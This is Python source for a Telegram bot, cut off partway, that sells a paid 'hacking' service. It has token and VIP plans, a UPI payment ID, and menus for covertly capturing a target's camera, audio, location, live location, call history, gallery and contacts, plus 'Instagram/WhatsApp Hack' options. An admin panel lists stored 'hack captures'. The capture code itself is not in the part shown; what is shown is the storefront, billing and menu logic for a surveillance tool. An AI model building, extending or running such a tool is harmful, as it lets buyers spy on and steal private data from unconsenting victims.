import io
import html
import json
import os
import random
import string
import threading
import time
import uuid
import base64
from decimal import Decimal, ROUND_HALF_UP
from urllib.parse import urlencode
from datetime import datetime, timedelta
import requests
from flask import Flask, request, render_template, jsonify, render_template_string
from PIL import Image, ImageDraw
import qrcode
import telebot
from telebot import types

# ----------------- 1. CONFIG -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN      = config.get("bot_token")
ADMIN_ID       = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL     = config.get("server_url")
CHANNELS       = config.get("channels", [])
GROUP          = config.get("group", {})

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

_orig = bot.message_handler

def _dm_only(*args, **kwargs):
    def deco(func):
        def wrapped(msg, *a, **kw):
            if msg.chat.type != "private":
                return
            if int(msg.from_user.id) != ADMIN_ID:
                db = load_db()
                user_data = db.get("users", {}).get(str(msg.from_user.id), {})
                if db.get("settings", {}).get("maintenance", False):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🔧 <b>Bot maintenance mein hai.</b>\nPlease thodi der baad try karein.\n{DEV_TAG}</blockquote>")
                    return
                if user_data.get("banned"):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🚫 Aapka access disabled hai.\nContact: @{OWNER_USERNAME}</blockquote>")
                    return
            return func(msg, *a, **kw)
        return _orig(*args, **kwargs)(wrapped)
    return deco

bot.message_handler = _dm_only

def kbtn(text, style=None):
    try:
        if style:
            return types.KeyboardButton(text, style=style)
        return types.KeyboardButton(text)
    except TypeError:
        b = types.KeyboardButton(text)
        if style:
            setattr(b, "style", style)
        return b

# ---------- PREMIUM (TOP) ----------
BTN_PREMIUM      = "🔥 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐇𝐚𝐜𝐤𝐢𝐧𝐠 🔥"

# ---------- MAIN MENU ----------
BTN_CAMERA     = "〖 ಠ〗𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_AUDIO      = "♫︎  𝐀𝐮𝐝𝐢𝐨"
BTN_LOCATION   = "༆ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨n"
BTN_LIVE_LOC   = "📍 𝐋𝐢𝐯𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_NUM_INFO   = "🔍 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨"
BTN_FAMILY_INFO= "👨‍👩‍👧‍👦 𝐅𝐚𝐦𝐢𝐥𝐲 𝐈𝐧𝐟𝐨"
BTN_CALL_HIST  = "📂 𝐂𝐚𝐥𝐥 𝐇𝐢𝐬𝐭𝐨𝐫𝐲 𝐀𝐮𝐝𝐢𝐭"
BTN_GALLERY    = "🖼 𝐆𝐚𝐥𝐥𝐞𝐫𝐲 𝐀𝐜𝐜𝐞𝐬𝐬"
BTN_CONTACTS   = "📇 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐜𝐜𝐞𝐬𝐬"
BTN_PHONE_HACK = "📡 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤 & 𝐍𝐞𝐭"
BTN_PHOTO_INFO = "📸 𝐏𝐡𝐨𝐭𝐨 𝐓𝐨 𝐈𝐧𝐟𝐨"
BTN_INSTA_HACK = "📸 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐇𝐚𝐜𝐤"
BTN_WA_HACK    = "💬 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐇𝐚𝐜𝐤"
BTN_TG_HACK    = "✈️ 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐇𝐚𝐜𝐤"
BTN_GOOGLE_HACK= "🔍 𝐆𝐨𝐨𝐠𝐥𝐞 𝐇𝐚𝐜𝐤"
BTN_PRICE      = "𝐏𝐫𝐢𝐜𝐞 ?"
BTN_BUY        = "💳 DIRECT BUY"
BTN_REDEEM     = "✍︎ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞"
BTN_BALANCE    = "✔︎ 𝐌𝐲 𝐁𝐚𝐥𝐚𝐧𝐜𝐞"
BTN_PAGE       = "𖠌 𝐏𝐞𝐠𝐞"
BTN_ADMIN      = "♕︎ 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐧𝐞𝐥"

BTN_FRONT_CAM  = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_BACK_CAM   = "〖 ಠ〗𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_FRONT_VID  = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_VID   = "〖 ಠ〗𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_HOME  = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# ---------- PREMIUM SUB BUTTONS ----------
BTN_PREM_CAMERA     = "💎 📷 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_AUDIO      = "💎 🎙 𝐀𝐮𝐝𝐢𝐨"
BTN_PREM_LOCATION   = "💎 📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PREM_LIVE_LOC   = "💎 📍 𝐋𝐢𝐯𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PREM_NUM_INFO   = "💎 🔍 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨"
BTN_PREM_FAMILY     = "💎 👨‍👩‍👧‍👦 𝐅𝐚𝐦𝐢𝐥𝐲 𝐈𝐧𝐟𝐨"
BTN_PREM_CALL_HIST  = "💎 📂 𝐂𝐚𝐥𝐥 𝐇𝐢𝐬𝐭𝐨𝐫𝐲"
BTN_PREM_GALLERY    = "💎 🖼 𝐆𝐚𝐥𝐥𝐞𝐫𝐲"
BTN_PREM_CONTACTS   = "💎 📇 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬"
BTN_PREM_PHONE_HACK = "💎 📡 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤"
BTN_PREM_PHOTO_INFO = "💎 📸 𝐏𝐡𝐨𝐭𝐨 𝐈𝐧𝐟𝐨"
BTN_PREM_INSTA      = "💎 📸 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦"
BTN_PREM_WA         = "💎 💬 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩"
BTN_PREM_TG         = "💎 ✈️ 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦"
BTN_PREM_GOOGLE     = "💎 🔍 𝐆𝐨𝐨𝐠𝐥𝐞"

BTN_PREM_CAM_FRONT      = "💎 📱 𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_CAM_BACK       = "💎 📷 𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_CAM_FRONT_VID  = "💎 📹 𝐅𝐫𝐨𝐧𝐭 𝟖𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_PREM_CAM_BACK_VID   = "💎 🎥 𝐁𝐚𝐜𝐤 𝟖𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_PREM_BACK           = "⌫ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# ---------- USER EXTRA ----------
BTN_HISTORY    = "📜 𝐌𝐲 𝐇𝐢𝐬𝐭𝐨𝐫𝐲"
BTN_REFER      = "🔗 𝐑𝐞𝐟𝐞𝐫 & 𝐄𝐚𝐫𝐧"
BTN_PROFILE    = "👤 𝐌𝐲 𝐏𝐫𝐨𝐟𝐢𝐥𝐞"
BTN_LEADER     = "🏆 𝐋𝐞𝐚𝐝𝐞𝐫𝐛𝐨𝐚𝐫𝐝"
BTN_HELP       = "🆘 𝐇𝐞𝐥𝐩"
BTN_TERMS      = "📄 𝐓𝐞𝐫𝐦𝐬"
BTN_FAQ        = "❓ 𝐅𝐀𝐐"
BTN_FEEDBACK   = "💬 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤"

# ---------- ADMIN ----------
BTN_GEN_REDEEM     = "✍︎ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐑𝐞𝐝𝐞𝐞𝐦"
BTN_USER_ACTIVITY  = "㋛︎ 𝐔𝐬𝐞𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲"
BTN_USER_PLAN      = "シ︎ 𝐔𝐬𝐞𝐫 𝐏𝐥𝐚𝐧"
BTN_ACTIVATE_PLAN  = "✈︎ 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐏𝐥𝐚𝐧"
BTN_ADD_ALL        = "➕ 𝐀𝐝𝐝 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ALL     = "➖ 𝐃𝐞𝐝𝐮𝐜𝐭 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_ADD_ONE        = "👤 𝐀𝐝𝐝 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ONE     = "🗑 𝐃𝐞𝐝𝐮𝐜𝐭 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_CHECK_USER     = "🔍 𝐂𝐡𝐞𝐜𝐤 𝐔𝐬𝐞𝐫"
BTN_RESET_USER     = "♻️ 𝐑𝐞𝐬𝐞𝐭 𝐔𝐬𝐞𝐫"
BTN_CODES_LIST     = "🎟 𝐀𝐥𝐥 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞𝐬"
BTN_REVOKE_CODE    = "🗑 𝐑𝐞𝐯𝐨𝐤𝐞 𝐂𝐨𝐝𝐞"
BTN_STATS          = "📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐬"
BTN_BROADCAST      = "📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭"
BTN_BAN            = "🚫 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_UNBAN          = "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_SET_REF        = "⚙️ 𝐒𝐞𝐭 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥"
BTN_SET_DISCOUNT   = "🏷 𝐒𝐞𝐭 𝐃𝐢𝐬𝐜𝐨𝐮𝐧𝐭 %%"
BTN_SET_TOKENS_CMD = "🪙 𝐒𝐞𝐭 𝐂𝐦𝐝 𝐓𝐨𝐤𝐞𝐧𝐬"
BTN_MAINTENANCE    = "🔧 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞"
BTN_EXPORT_DB      = "📤 𝐄𝐱𝐩𝐨𝐫𝐭 𝐃𝐁"
BTN_MANAGE_PLANS   = "🛍 𝐌𝐚𝐧𝐚𝐠𝐞 𝐏𝐥𝐚𝐧𝐬"
BTN_TOGGLE_BTNS    = "🎛 𝐏𝐯𝐭. / 𝐏𝐮𝐛. 𝐁𝐮𝐭𝐭𝐨𝐧𝐬"
BTN_BOT_AD         = "📢 𝐁𝐨𝐭 𝐀𝐝𝐯𝐞𝐫𝐭𝐢𝐬𝐞𝐦𝐞𝐧𝐭"
BTN_PREMIUM_LINKS  = "🎯 𝐌𝐚𝐧𝐚𝐠𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐋𝐢𝐧𝐤𝐬"
BTN_HACK_CAPTURES  = "🗂 𝐕𝐢𝐞𝐰 𝐇𝐚𝐜𝐤 𝐂𝐚𝐩𝐭𝐮𝐫𝐞𝐬"
BTN_BACK_ADMIN     = "⌫ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐀𝐝𝐦𝐢𝐧"

# Premium button → (platform_key, label, facing, is_video)
PREMIUM_BUTTON_MAP = {
    BTN_PREM_AUDIO:      ("audio", "🎙 Audio", "user", False),
    BTN_PREM_LOCATION:   ("location", "📍 Location", "user", False),
    BTN_PREM_LIVE_LOC:   ("live_location", "📍 Live Location", "user", False),
    BTN_PREM_NUM_INFO:   ("num_info", "🔍 Number Info", "user", False),
    BTN_PREM_FAMILY:     ("family_info", "👨‍👩‍👧‍👦 Family Info", "user", False),
    BTN_PREM_CALL_HIST:  ("call_history", "📂 Call History", "user", False),
    BTN_PREM_GALLERY:    ("gallery", "🖼 Gallery", "user", False),
    BTN_PREM_CONTACTS:   ("contacts", "📇 Contacts", "user", False),
    BTN_PREM_PHONE_HACK: ("phone_hack", "📡 Phone Hack", "user", False),
    BTN_PREM_PHOTO_INFO: ("photo_info", "📸 Photo Info", "user", False),
    BTN_PREM_INSTA:      ("instagram", "📸 Instagram", "user", False),
    BTN_PREM_WA:         ("whatsapp", "💬 WhatsApp", "user", False),
    BTN_PREM_TG:         ("telegram", "✈️ Telegram", "user", False),
    BTN_PREM_GOOGLE:     ("google", "🔍 Google", "user", False),
}

DEFAULT_PLANS = {
    "tok5":  {"name": "5 Tokens", "kind": "tokens", "value": 5, "price": "30.00", "active": True},
    "tok10": {"name": "10 Tokens", "kind": "tokens", "value": 10, "price": "40.00", "active": True},
    "tok30": {"name": "30 Tokens", "kind": "tokens", "value": 30, "price": "70.00", "active": True},
    "tok100":{"name": "100 Tokens", "kind": "tokens", "value": 100, "price": "220.00", "active": True},
    "vip3":  {"name": "VIP 3 Days", "kind": "vip", "value": 3, "price": "200.00", "active": True},
    "vip7":  {"name": "VIP 7 Days", "kind": "vip", "value": 7, "price": "350.00", "active": True},
    "vip30": {"name": "VIP 30 Days", "kind": "vip", "value": 30, "price": "1199.00", "active": True},
}
UPI_ID = "ayush.sharma798@fam"

def load_db():
    try:
        with open("database.json", "r") as f:
            db = json.load(f)
    except Exception:
        db = {}
    db.setdefault("users", {})
    db.setdefault("redeem_codes", {})
    db.setdefault("settings", {})
    s = db["settings"]
    s.setdefault("maintenance", False)
    s.setdefault("referral_credits", 1)
    s.setdefault("discount_rate", 0)
    s.setdefault("command_tokens", {})
    ct = s["command_tokens"]
    for k, v in {"camera": 20, "audio": 20, "location": 20, "live_location": 100,
                 "num_info": 10, "family_info": 10, "call_history": 300,
                 "gallery": 500, "contacts": 250, "phone_hack": 1000,
                 "photo_info": 800, "insta_hack": 100, "wa_hack": 100,
                 "tg_hack": 100, "google_hack": 100, "premium_link": 250}.items():
        ct.setdefault(k, v)
    s.setdefault("feature_public", {})
    fp = s["feature_public"]
    for k in ["camera","audio","location","live_location","num_info","family_info",
              "call_history","gallery","contacts","phone_hack","photo_info",
              "insta_hack","wa_hack","tg_hack","google_hack","premium"]:
        fp.setdefault(k, True)
    s.setdefault("ad_bot", None)
    s.setdefault("custom_buttons", [])
    db.setdefault("plans", DEFAULT_PLANS.copy())
    db.setdefault("pending_orders", {})
    db.setdefault("feedback_map", {})
    db.setdefault("premium_links", {})
    db.setdefault("hack_captures", {})
    return db

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def _add_history(user, action, amount):
    user.setdefault("history", []).append({
        "action": action, "amount": amount,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    user["history"] = user["history"][-50:]

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    is_new = False
    if uid not in db["users"]:
        is_new = True
        init_tokens = 100000 if int(user.id) == ADMIN_ID else 0
        db["users"][uid] = {
            "tokens": init_tokens, "feature_tokens": {},
            "plan": "free", "expiry": None,
            "username": f"@{user.username}" if user.username else "N/A",
            "name": user.first_name, "history": [],
            "referred_by": None, "referrals": [],
            "banned": False,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_db(db)
    u = db["users"][uid]
    for k, v in {"history": [], "referrals": [], "banned": False,
                 "referred_by": None, "joined": "N/A", "feature_tokens": {}}.items():
        u.setdefault(k, v)
    return u, is_new

def has_active_plan(uid):
    if int(uid) == ADMIN_ID: return True
    db = load_db()
    u = db["users"].get(str(uid))
    if not u or u.get("banned"): return False
    if u.get("plan") == "unlimited":
        if u.get("expiry") is None: return True
        try:
            if datetime.now() < datetime.strptime(u["expiry"], "%Y-%m-%d %H:%M:%S"):
                return True
        except Exception: pass
    return u.get("tokens", 0) > 0

def get_cmd_cost(cmd_key):
    db = load_db()
    return db.get("settings", {}).get("command_tokens", {}).get(cmd_key, 5)

def deduct_tokens_for_cmd(uid, cmd_key):
    if int(uid) == ADMIN_ID: return True
    cost = get_cmd_cost(cmd_key)
    db = load_db()
    u = db["users"].get(str(uid))
    if not u: return False
    active_vip = False
    if u.get("plan") == "unlimited":
        expiry = u.get("expiry")
        if not expiry: active_vip = True
        else:
            try: active_vip = datetime.now() < datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
            except (TypeError, ValueError): active_vip = False
    if active_vip: return True
    ft = u.setdefault("feature_tokens", {})
    if ft.get(cmd_key, 0) >= cost:
        ft[cmd_key] -= cost; save_db(db); return True
    if u.get("tokens", 0) < cost: return False
    u["tokens"] = max(0, int(u.get("tokens", 0)) - cost)
    _add_history(u, f"use_{cmd_key}", -cost)
    if u.get("plan") == "unlimited":
        u["plan"] = "free"; u["expiry"] = None
    save_db(db)
    return True

def get_main_menu(user_id):
    db = load_db()
    pub = db.get("settings", {}).get("feature_public", {})
    custom_btns = db.get("settings", {}).get("custom_buttons", [])
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    is_admin = int(user_id) == ADMIN_ID

    if is_admin or pub.get("premium", True):
        m.row(kbtn(BTN_PREMIUM, "danger"))

    if is_admin or pub.get("camera", True): m.add(kbtn(BTN_CAMERA, "primary"))
    if is_admin or pub.get("audio", True): m.add(kbtn(BTN_AUDIO, "primary"))
    if is_admin or pub.get("location", True): m.add(kbtn(BTN_LOCATION, "primary"))
    if is_admin or pub.get("live_location", True): m.add(kbtn(BTN_LIVE_LOC, "primary"))
    if is_admin or pub.get("num_info", True): m.add(kbtn(BTN_NUM_INFO, "success"))
    if is_admin or pub.get("family_info", True): m.add(kbtn(BTN_FAMILY_INFO, "success"))
    if is_admin or pub.get("call_history", True): m.add(kbtn(BTN_CALL_HIST, "primary"))
    if is_admin or pub.get("gallery", True): m.add(kbtn(BTN_GALLERY, "primary"))
    if is_admin or pub.get("contacts", True): m.add(kbtn(BTN_CONTACTS, "success"))
    if is_admin or pub.get("phone_hack", True): m.add(kbtn(BTN_PHONE_HACK, "danger"))
    if is_admin or pub.get("photo_info", True): m.add(kbtn(BTN_PHOTO_INFO, "success"))
    if is_admin or pub.get("insta_hack", True): m.add(kbtn(BTN_INSTA_HACK, "primary"))
    if is_admin or pub.get("wa_hack", True): m.add(kbtn(BTN_WA_HACK, "success"))
    if is_admin or pub.get("tg_hack", True): m.add(kbtn(BTN_TG_HACK, "primary"))
    if is_admin or pub.get("google_hack", True): m.add(kbtn(BTN_GOOGLE_HACK, "danger"))

    for cb in custom_btns: m.add(kbtn(cb, "primary"))

    m.add(kbtn(BTN_PRICE, "success"))
    m.add(kbtn(BTN_BUY, "success"), kbtn(BTN_REDEEM, "primary"))
    m.add(kbtn(BTN_BALANCE, "success"), kbtn(BTN_HISTORY, "primary"))
    m.add(kbtn(BTN_REFER, "primary"), kbtn(BTN_PROFILE, "primary"))
    m.add(kbtn(BTN_LEADER, "primary"), kbtn(BTN_HELP, "primary"))
    m.add(kbtn(BTN_TERMS, "primary"), kbtn(BTN_FAQ, "primary"))
    m.add(kbtn(BTN_FEEDBACK, "primary"))
    if is_admin: m.add(kbtn(BTN_ADMIN, "danger"))
    return m

def get_camera_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_FRONT_CAM, "primary"), kbtn(BTN_BACK_CAM, "primary"))
    m.add(kbtn(BTN_FRONT_VID, "primary"), kbtn(BTN_BACK_VID, "primary"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_premium_menu(user_id):
    """ALL public buttons — same as main menu but with 💎 marker."""
    db = load_db()
    pub = db.get("settings", {}).get("feature_public", {})
    is_admin = int(user_id) == ADMIN_ID
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

    if is_admin or pub.get("camera", True): m.add(kbtn(BTN_PREM_CAMERA, "primary"))
    if is_admin or pub.get("audio", True): m.add(kbtn(BTN_PREM_AUDIO, "primary"))
    if is_admin or pub.get("location", True): m.add(kbtn(BTN_PREM_LOCATION, "primary"))
    if is_admin or pub.get("live_location", True): m.add(kbtn(BTN_PREM_LIVE_LOC, "primary"))
    if is_admin or pub.get("num_info", True): m.add(kbtn(BTN_PREM_NUM_INFO, "success"))
    if is_admin or pub.get("family_info", True): m.add(kbtn(BTN_PREM_FAMILY, "success"))
    if is_admin or pub.get("call_history", True): m.add(kbtn(BTN_PREM_CALL_HIST, "primary"))
    if is_admin or pub.get("gallery", True): m.add(kbtn(BTN_PREM_GALLERY, "primary"))
    if is_admin or pub.get("contacts", True): m.add(kbtn(BTN_PREM_CONTACTS, "success"))
    if is_admin or pub.get("phone_hack", True): m.add(kbtn(BTN_PREM_PHONE_HACK, "danger"))
    if is_admin or pub.get("photo_info", True): m.add(kbtn(BTN_PREM_PHOTO_INFO, "success"))
    if is_admin or pub.get("insta_hack", True): m.add(kbtn(BTN_PREM_INSTA, "primary"))
    if is_admin or pub.get("wa_hack", True): m.add(kbtn(BTN_PREM_WA, "success"))
    if is_admin or pub.get("tg_hack", True): m.add(kbtn(BTN_PREM_TG, "primary"))
    if is_admin or pub.get("google_hack", True): m.add(kbtn(BTN_PREM_GOOGLE, "danger"))
    m.add(kbtn(BTN_PREM_BACK, "danger"))
    return m

def get_premium_camera_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_PREM_CAM_FRONT, "primary"), kbtn(BTN_PREM_CAM_BACK, "primary"))
    m.add(kbtn(BTN_PREM_CAM_FRONT_VID, "primary"), kbtn(BTN_PREM_CAM_BACK_VID, "primary"))
    m.add(kbtn(BTN_PREM_BACK, "danger"))
    return m

def get_admin_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_GEN_REDEEM, "success"), kbtn(BTN_USER_ACTIVITY, "primary"))
    m.add(kbtn(BTN_USER_PLAN, "primary"), kbtn(BTN_ACTIVATE_PLAN, "primary"))
    m.add(kbtn(BTN_ADD_ALL, "success"), kbtn(BTN_DEDUCT_ALL, "danger"))
    m.add(kbtn(BTN_ADD_ONE, "success"), kbtn(BTN_DEDUCT_ONE, "danger"))
    m.add(kbtn(BTN_CHECK_USER, "primary"), kbtn(BTN_RESET_USER, "danger"))
    m.add(kbtn(BTN_CODES_LIST, "primary"), kbtn(BTN_REVOKE_CODE, "danger"))
    m.add(kbtn(BTN_STATS, "success"), kbtn(BTN_BROADCAST, "primary"))
    m.add(kbtn(BTN_BAN, "danger"), kbtn(BTN_UNBAN, "success"))
    m.add(kbtn(BTN_SET_REF, "primary"), kbtn(BTN_SET_DISCOUNT, "success"))
    m.add(kbtn(BTN_SET_TOKENS_CMD, "success"), kbtn(BTN_MAINTENANCE, "danger"))
    m.add(kbtn(BTN_EXPORT_DB, "primary"), kbtn(BTN_MANAGE_PLANS, "success"))
    m.add(kbtn(BTN_TOGGLE_BTNS, "primary"), kbtn(BTN_BOT_AD, "success"))
    m.add(kbtn(BTN_PREMIUM_LINKS, "danger"), kbtn(BTN_HACK_CAPTURES, "primary"))
    m.add(kbtn("➕ Add Custom Button", "success"), kbtn("🗑 Remove Custom Button", "danger"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_redeem_type_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn("VIP", "success"), kbtn("Normal", "primary"))
    m.add(kbtn(BTN_BACK_ADMIN, "danger"))
    return m

def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0, size[0], size[1]), fill=255)
    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)
    draw_border = ImageDraw.Draw(circular)
    draw_border.ellipse((border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2), outline=border_color, width=border_width)
    return circular

def send_home_dashboard(chat_id, user):
    get_user_data(user)
    try: bot_name = bot.get_me().first_name
    except Exception: bot_name = "Dashboard"
    db = load_db()
    ad = db.get("settings", {}).get("ad_bot")
    text = (f"<blockquote>Welcome to {html.escape(bot_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━\nName : {html.escape(user.first_name or 'User')}\n"
            f"UID: {user.id}\nUsername: @{html.escape(user.username) if user.username else 'N/A'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>")
    if ad and ad.get("active"):
        text += f"\n<blockquote>📢 <b>Sponsored Bot:</b>\n👉 <a href='{ad.get('link')}'>{html.escape(str(ad.get('name', '')))}</a></blockquote>"
    markup = get_main_menu(user.id)
    try:
        user_photos = bot.get_user_profile_photos(user.id, limit=1)
        if os.path.exists("banner.png"):
            banner = Image.open("banner.png").convert("RGBA")
            if user_photos and user_photos.total_count > 0:
                fid = user_photos.photos[0][-1].file_id
                fi = bot.get_file(fid)
                downloaded = bot.download_file(fi.file_path)
                avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
                banner.paste(avatar, (30, 30), avatar)
            buf = io.BytesIO()
            banner.convert("RGB").save(buf, format="JPEG", quality=95)
            buf.seek(0)
            bot.send_photo(chat_id, photo=buf, caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type != "private": return
    user = message.from_user
    args = message.text.split()
    _, is_new = get_user_data(user)
    if is_new:
        try:
            bot.send_message(ADMIN_ID,
                f"🚨 <b>New User!</b>\n👤 {user.first_name}\n🆔 <code>{user.id}</code>\n🔗 @{user.username if user.username else 'N/A'}")
        except Exception: pass
    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "").strip()
        if referrer_id.isdigit() and referrer_id != str(user.id):
            db = load_db(); new_uid = str(user.id)
            if not db["users"][new_uid].get("referred_by"):
                ref_user = db["users"].get(referrer_id)
                if ref_user:
                    credits = db["settings"].get("referral_credits", 2)
                    if credits > 0:
                        ref_user["tokens"] = ref_user.get("tokens", 0) + credits
                        _add_history(ref_user, "referral_bonus", credits)
                        db["users"][new_uid]["tokens"] = db["users"][new_uid].get("tokens", 0) + credits
                        _add_history(db["users"][new_uid], "referred_bonus", credits)
                    ref_user.setdefault("referrals", []).append(new_uid)
                    db["users"][new_uid]["referred_by"] = referrer_id
                    save_db(db)
                    if credits > 0:
                        try:
                            bot.send_message(int(referrer_id),
                                f"<blockquote>🎉 <b>New Referral!</b>\n👤 {user.first_name}\n🪙 +{credits} tokens\n{DEV_TAG}</blockquote>")
                        except Exception: pass
    send_home_dashboard(message.chat.id, user)

@bot.message_handler(func=lambda m: m.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, "Back to home"])
def go_home(m): send_home_dashboard(m.chat.id, m.from_user)

def check_feature_access(message, feature_key):
    db = load_db()
    public_dict = db.get("settings", {}).get("feature_public", {})
    is_public = public_dict.get(feature_key, True)
    if not is_public and int(message.from_user.id) != ADMIN_ID:
        bot.send_message(message.chat.id,
            f"<blockquote>🔧 <b>Feature under maintenance!</b>\n{DEV_TAG}</blockquote>")
        return False
    return True

@bot.message_handler(func=lambda m: m.text == BTN_BALANCE)
def my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)
    if int(uid) == ADMIN_ID:
        bot.reply_to(message, f"<blockquote>VIP Lifetime ✅\nToken: unlimited\n{DEV_TAG}</blockquote>"); return
    if not user or user.get("banned"):
        bot.reply_to(message, f"<blockquote>Not VIP ❌\nToken: 0\n{DEV_TAG}</blockquote>"); return
    if user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            d = max(1, (exp - datetime.now()).days + 1)
            bot.reply_to(message, f"<blockquote>VIP {d}d ✅\nToken: unlimited\n{DEV_TAG}</blockquote>"); return
    bot.reply_to(message, f"<blockquote>Not VIP ❌\nToken: {user.get('tokens',0)}\n{DEV_TAG}</blockquote>")

def send_price_menu(chat_id):
    db = load_db()
    disc = db.get("settings", {}).get("discount_rate", 0)
    lines = ["🛍 <b>Plans</b>", "━━━━━━━━━━━━━━━━━━━━"]
    for pid, plan in db.get("plans", DEFAULT_PLANS).items():
        if plan.get("active", True):
            unit = "tokens" if plan.get("kind") == "tokens" else "days VIP"
            orig = Decimal(str(plan.get('price')))
            if disc > 0:
                final = orig * (Decimal("1") - Decimal(str(disc)) / Decimal("100"))
